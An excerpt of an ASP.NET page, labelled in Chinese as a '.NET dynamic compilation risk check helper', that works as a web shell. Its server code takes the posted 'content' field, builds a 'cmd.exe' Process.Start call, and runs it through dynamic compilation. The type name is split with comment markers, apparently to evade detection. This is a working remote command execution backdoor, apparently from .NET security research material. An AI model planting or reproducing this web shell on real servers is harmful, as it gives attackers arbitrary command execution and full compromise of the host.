...
<script runat="server">
    protected void Page_load(object sender, EventArgs e)
    {
        ...
        if (IsPostBack)
        {
            ...
            {
                content = string.Format("Sys/*@Ivan1ee@*/tem.Di/*@Ivan1ee@*/agnostics.Pr/*@Ivan1ee@*/ocess.St/*@Ivan1ee@*/art(\"cmd.exe\", \"{0}\");".Replace("/*@Ivan1ee@*/",""),Request.Form["content"]) ;
                string ExecCode = EncodeBase64("utf-8", content);
                DynamicCodeExecute(ExecCode);
...
<form id="form1" runat="server" method="post">
        <h2 style="margin: 30px 0px;text-align: center">.NET 动态编译风险闭环检查小蜜</h2>
        <div>
                ...
                <div class="tab-pane fade <% if (Request.Form.Count == 0 && Request.QueryString.Count == 0) { Response.Write("show active"); } %>" id="home">
                    <div class="mb-3" style="margin: 20px 20px;">
                        <dl class="row">
                            ...
                            <dt class="col-sm-3">2.公众号</dt>
                            <dd class="col-sm-9">dotNet安全矩阵</dd>
                            
                            <dt class="col-sm-3">3.二维码</dt>
